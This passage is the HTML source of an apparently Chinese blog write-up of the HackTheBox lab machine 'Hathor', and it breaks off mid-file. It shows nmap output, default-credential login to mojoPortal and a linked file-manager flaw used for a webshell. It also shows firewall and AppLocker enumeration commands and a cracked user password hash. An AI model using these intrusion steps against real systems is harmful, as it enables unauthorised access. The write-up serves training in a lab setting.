@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Hathor - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;459  10.10.11.147                                                                                                              端口扫描80和常规windows域端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hathor - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2022/04/16/Hathor-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;459  10.10.11.147                                                                                                              端口扫描80和常规windows域端口">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112101.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112102.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112103.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112104.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112105.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112106.jpg">
+<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112107.jpg">
+<meta property="article:published_time" content="2022-04-16T06:14:18.000Z">
+<meta property="article:modified_time" content="2022-11-21T06:15:25.883Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022112101.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/about/"  >
+                <i class="icon icon-lg icon-link"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Hathor - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Hathor - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-16T06:14:18.000Z" itemprop="datePublished" class="page-time">
+  2022-04-16
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-11-147"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.11.147</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#mojoPortal"><span class="post-toc-number">3.</span> <span class="post-toc-text">mojoPortal</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Firewall-and-AppLocker"><span class="post-toc-number">4.</span> <span class="post-toc-text">Firewall and AppLocker</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AppLocker-规则"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">AppLocker 规则</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Get-bADpasswords"><span class="post-toc-number">5.</span> <span class="post-toc-text">Get-bADpasswords</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Accessible-CSVs"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">Accessible\CSVs</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#run-vbs"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">run.vbs</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SMB"><span class="post-toc-number">6.</span> <span class="post-toc-text">SMB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Share"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">Share</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-krb5-conf"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">&#x2F;etc&#x2F;krb5.conf</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#7-zip64-dll"><span class="post-toc-number">7.</span> <span class="post-toc-text">7-zip64.dll</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#enum"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">enum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#战略"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">战略</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#GinaWild-amp-user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">GinaWild &amp; user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息"><span class="post-toc-number">9.</span> <span class="post-toc-text">信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#访问证书"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">访问证书</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Get-bADpasswords-1"><span class="post-toc-number">10.</span> <span class="post-toc-text">Get-bADpasswords</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bpassrunner"><span class="post-toc-number">11.</span> <span class="post-toc-text">bpassrunner</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">12.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dcsync"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">dcsync</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">13.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Kerberos-授权"><span class="post-toc-number">13.1.</span> <span class="post-toc-text">Kerberos 授权</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell"><span class="post-toc-number">13.2.</span> <span class="post-toc-text">shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flags"><span class="post-toc-number">13.3.</span> <span class="post-toc-text">flags</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">14.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hathor-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Hathor - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-16 14:14:18" datetime="2022-04-16T06:14:18.000Z"  itemprop="datePublished">2022-04-16</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.com/home/machines/profile/459" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/459</a></p>
+</li>
+<li><h2 id="10-10-11-147"><a href="#10-10-11-147" class="headerlink" title="10.10.11.147"></a>10.10.11.147</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80和常规windows域端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.147</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 12:27 CST</span><br><span class="line">Nmap scan report for 10.10.11.147</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 29 disallowed entries (15 shown)</span><br><span class="line">| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/</span><br><span class="line">| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$</span><br><span class="line">| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx</span><br><span class="line">|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Home - mojoPortal</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-21 04:29:39Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=hathor.windcorp.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb</span><br><span class="line">| Not valid before: 2022-03-18T07:51:40</span><br><span class="line">|_Not valid after:  2023-03-18T07:51:40</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=hathor.windcorp.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb</span><br><span class="line">| Not valid before: 2022-03-18T07:51:40</span><br><span class="line">|_Not valid after:  2023-03-18T07:51:40</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-11-21T04:31:02+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=hathor.windcorp.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb</span><br><span class="line">| Not valid before: 2022-03-18T07:51:40</span><br><span class="line">|_Not valid after:  2023-03-18T07:51:40</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=hathor.windcorp.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:hathor.windcorp.htb</span><br><span class="line">| Not valid before: 2022-03-18T07:51:40</span><br><span class="line">|_Not valid after:  2023-03-18T07:51:40</span><br><span class="line">|_ssl-date: 2022-11-21T04:31:01+00:00; +1s from scanner time.</span><br><span class="line">Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   311:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2022-11-21T04:30:26</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 184.70 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个mojoPortal：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="mojoPortal"><a href="#mojoPortal" class="headerlink" title="mojoPortal"></a>mojoPortal</h1><p>默认账号密码登录：</p>
+<ul>
+<li>Admin Password Reset - mojoPortal<br><a href="https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password" target="_blank" rel="noopener">https://www.mojoportal.com/Forums/Thread.aspx?pageid=5&amp;t=2902~-1#:~:text=Enter%20%22admin%40admin.com,and%20%22admin%22%20for%20Password</a>.</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>Administration -&gt; System Information中得到版本信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mojoPortal Version 2.7.0.0 MSSQL</span><br><span class="line">Feature Versions </span><br><span class="line">Feature	Schema Version</span><br><span class="line">blog	2.6.1.9</span><br><span class="line">contactform	0.0.0.6</span><br><span class="line">eventcalendar	0.0.0.6</span><br><span class="line">feed-manager	1.0.1.1</span><br><span class="line">forums	2.2.0.5</span><br><span class="line">imagegallery	0.0.0.8</span><br><span class="line">kdmediaplayer	1.0.0.1</span><br><span class="line">linksmodule	1.0.0.9</span><br><span class="line">pollfeature-byChristianFredh	0.0.0.5</span><br><span class="line">sharedfiles	1.1.0.0</span><br><span class="line">superflexi	0.0.1.7</span><br><span class="line">surveyfeature	1.9.0.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>github issue中找到相关漏洞，用于获取webshell：</p>
+<ul>
+<li>Vulnerabilities in Legacy File Manager · Issue #146 · i7MEDIA/mojoportal<br><a href="https://github.com/i7MEDIA/mojoportal/issues/146" target="_blank" rel="noopener">https://github.com/i7MEDIA/mojoportal/issues/146</a></li>
+</ul>
+<p>有一点区别就是，issue里是重命名成aspx，这里是复制成aspx文件</p>
+<p>路径可以直接在首页根据图片路径得到：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022112105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="Firewall-and-AppLocker"><a href="#Firewall-and-AppLocker" class="headerlink" title="Firewall and AppLocker"></a>Firewall and AppLocker</h1><p>webshell执行命令会发现存在限制，查看防火墙和AppLocker设置：</p>
+<ul>
+<li>Enumerating Firewall And AppLocker Rules [Hathor - HackTheBox] - YouTube<br><a href="https://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf" target="_blank" rel="noopener">https://www.youtube.com/watch?v=w_Kro3S4xE8&amp;ab_channel=0xdf</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"Get-NetFirewallRule -PolicyStore ActiveStore | where &#123; <span class="variable">$_</span>.Action -eq \"</span>Block\<span class="string">" &#125;"</span></span><br><span class="line"></span><br><span class="line">powershell.exe -c <span class="string">"Get-AppLockerPolicy -Effective -Xml"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="AppLocker-规则"><a href="#AppLocker-规则" class="headerlink" title="AppLocker 规则"></a>AppLocker 规则</h2><ul>
+<li>Appx - 签名</li>
+<li>dll<ul>
+<li>Microsoft签名</li>
+<li>在Program Files 和 Windows目录中</li>
+<li>由admin组运行</li>
+<li><code>C:\share\scripts\7-zip64.dll</code>或者<code>C:\Get-bADpasswords\PSI\Psi_x64.dll</code></li>
+</ul>
+</li>
+<li>exe<ul>
+<li>明确阻止已知的AppLocker 绕过甚至包括由 Microsoft 签名<code>MSDT.exe</code>，PRESENTATIONHOST.exe<code>MSHTA.exe</code>，`MSBUILD.exe``INSTALLUTIL.exe</li>
+<li>允许由 <code>administrator@windcorp.com</code>、AutoIt 或 Microsoft 签名（如果不在上面）</li>
+<li>显式阻止已知路径，如<code>%SYSTEM#2%\Tasks:*</code>、<code>%SYSTEM32%\regvr32</code>、<code>%SYSTEM32%\spool\drivers\color:*</code>等。</li>
+<li>在 Program Files 和 Windows 文件夹中</li>
+<li>由admin组运行</li>
+<li>C:\share\Bginfo64.exe</li>
+</ul>
+</li>
+<li>msi<ul>
+<li>签名</li>
+<li>在<code>C:\Windows\Installer</code>目录中</li>
+<li>由admin组运行</li>
+</ul>
+</li>
+<li>scripts<ul>
+<li>由 <a href="mailto:administrator@windcorp.htb">administrator@windcorp.htb</a> 签名</li>
+<li>在 Program Files 和 Windows 文件夹中</li>
+<li>由admin组运行</li>
+<li><code>C:\script\login.cmd</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="Get-bADpasswords"><a href="#Get-bADpasswords" class="headerlink" title="Get-bADpasswords"></a>Get-bADpasswords</h1><p>枚举目录文件，C盘发现Get-bADpasswords目录，里面一些文件：</p>
+<p>这里是一个副本</p>
+<ul>
+<li>improsec/Get-bADpasswords: Get insights into the actual strength and quality of passwords in Active Directory.<br><a href="https://github.com/improsec/Get-bADpasswords" target="_blank" rel="noopener">https://github.com/improsec/Get-bADpasswords</a></li>
+</ul>
+<p><code>run.vbs</code>不是那个 repo 的一部分，查看这个文件,获得有效签名：</p>
+<p>Get-bADpasswords.ps1在脚本的顶部有一个配置部分：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="variable">$log_filename</span>  = <span class="string">".\Accessible\Logs\log_<span class="variable">$domain_name</span>-<span class="variable">$current_timestamp</span>.txt"</span></span><br><span class="line"><span class="variable">$csv_filename</span>  = <span class="string">".\Accessible\CSVs\exported_<span class="variable">$domain_name</span>-<span class="variable">$current_timestamp</span>.csv"</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$write_to_log_file</span> = <span class="literal">$true</span></span><br><span class="line"><span class="variable">$write_to_csv_file</span> = <span class="literal">$true</span></span><br><span class="line"><span class="variable">$write_hash_to_logs</span> = <span class="literal">$true</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><code>$write_hash_to_logs</code>很有趣，因为它暗示它可能正在记录错误的密码。</p>
+<h2 id="Accessible-CSVs"><a href="#Accessible-CSVs" class="headerlink" title="Accessible\CSVs"></a>Accessible\CSVs</h2><p>继续查看Accessible\CVSs目录，在其中最新的一个文件中BeatriceMill用户的hash，破解出来密码：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">type c:\Get-bADpasswords\Accessible\CSVs\exported_windcorp-<span class="number">13102022</span>-<span class="number">210946</span>.csv</span><br><span class="line"></span><br><span class="line">Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present <span class="keyword">in</span> password list(s)</span><br><span class="line">active;weak;regular;BeatriceMill;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3783586571</span>-<span class="number">2109290616</span>-<span class="number">3725730865</span>-<span class="number">5992</span>;<span class="number">9</span>cb01504ba0247ad5c6e08f7ccae7903;<span class="string">'leaked-passwords-v7'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文</span></span><br><span class="line">!!!!ilovegood17</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="run-vbs"><a href="#run-vbs" class="headerlink" title="run.vbs"></a>run.vbs</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> WshShell = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</span><br><span class="line">Command = <span class="string">"eventcreate /T Information /ID 444 /L Application /D "</span> &amp; _</span><br><span class="line">    <span class="built_in">Chr</span>(<span class="number">34</span>) &amp; <span class="string">"Check passwords"</span> &amp; <span class="built_in">Chr</span>(<span class="number">34</span>)</span><br><span class="line">WshShell.Run Command</span><br><span class="line"><span class="comment">'' SIG '' Begin signature block</span></span><br><span class="line"><span class="comment">'' SIG '' MIIIkgYJKoZIhvcNAQcCoIIIgzCCCH8CAQExDzANBglg</span></span><br><span class="line"><span class="comment">'' SIG '' hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor</span></span><br><span class="line"><span class="comment">'' SIG '' BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC</span></span><br><span class="line"><span class="comment">'' SIG '' AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg</span></span><br><span class="line"><span class="comment">'' SIG '' V4iIgvjS/tzbdg7yzPOhQtBxr63sSQYGiJME4+J1oz6g</span></span><br><span class="line"><span class="comment">'' SIG '' ggXTMIIFzzCCBLegAwIBAgITIAAAAAdbcJwdN1cU7gAA</span></span><br><span class="line"><span class="comment">'' SIG '' AAAABzANBgkqhkiG9w0BAQsFADBOMRMwEQYKCZImiZPy</span></span><br><span class="line"><span class="comment">'' SIG '' 